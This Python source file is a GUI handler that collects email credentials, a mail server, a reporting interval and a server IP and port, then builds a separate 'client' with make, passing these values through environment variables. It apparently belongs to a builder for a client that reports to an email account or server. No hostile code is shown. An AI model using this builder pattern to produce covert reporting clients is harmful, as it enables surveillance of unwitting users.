import logging
import os
import subprocess

from gui import UIManager
from utils import EventHandlerRegister, AsyncTkinter, ValidatorCompileEnv, ShowMessageBox
from settings import app_config, user_config

logger = logging.getLogger(__name__)


class CompileHandler:
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_CLOSE_TOPLEVEL)
    def close_toplevel():
        logger.info('Close Toplevel Compile')
        toplevel = UIManager.REGISTER.get(app_config.gui.keys.widget_names.COMPILE_TOPLEVEL)
        toplevel.destroy()
        btn = UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_CREATE)
        btn.config(state='normal')

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_COMPILE)
    def click_compile():
        env = os.environ.copy()
        cfg = app_config.compile
        make_clean = ['make', 'clean']
        if user_config.DEBUG:
            make_command = ['make', 'debug']
        else:
            make_command = ['make']

        entries = {
            app_config.gui.keys.widget_names.EMAIL_ENTRY: cfg.ENV_EMAIL_USERNAME,
            app_config.gui.keys.widget_names.ENTRY_PASSWORD: cfg.ENV_EMAIL_PASSWORD,
            app_config.gui.keys.widget_names.ENTRY_SERVER: cfg.ENV_EMAIL_SERVER,
            app_config.gui.keys.widget_names.ENTRY_PORT: cfg.ENV_EMAIL_PORT,
            app_config.gui.keys.widget_names.DURATION_SPINBOX: cfg.ENV_EMAIL_DURATION,
            app_config.gui.keys.widget_names.SERVER_IP_ENTRY: cfg.ENV_SERVER_IP,
            app_config.gui.keys.widget_names.SERVER_PORT_ENTRY: cfg.ENV_SERVER_PORT
        }
        validators = [(ValidatorCompileEnv.validate_duration, cfg.ENV_EMAIL_DURATION),
                      (ValidatorCompileEnv.validate_port, cfg.ENV_SERVER_PORT)]

        for entry in entries:
            env[entries[entry]] = UIManager.REGISTER.get(entry).get()

        if not user_config.DEBUG:
            for validator, key in validators:
                ok, msg = validator(env[key])
                if not ok:
                    ShowMessageBox.show('show_error', *msg)
                    return

        if not app_config.CLIENT_DIR.exists():
            logger.error(f'Client not exists, {app_config.CLIENT_DIR}')
            return

        try:
            subprocess.run(make_clean, cwd=app_config.CLIENT_DIR, env=env, check=True, capture_output=True)
            result = subprocess.run(make_command, cwd=app_config.CLIENT_DIR, env=env, check=True, capture_output=True)
            logger.info(f'Success, make: {result.stdout.decode()}')
        except subprocess.CalledProcessError as e:
            logger.error('Failed compile, make error')
            logger.debug(f'make output: {e.stderr.decode()}')
        EventHandlerRegister.get(app_config.gui.keys.callback_names.CLICK_CLOSE_TOPLEVEL)()
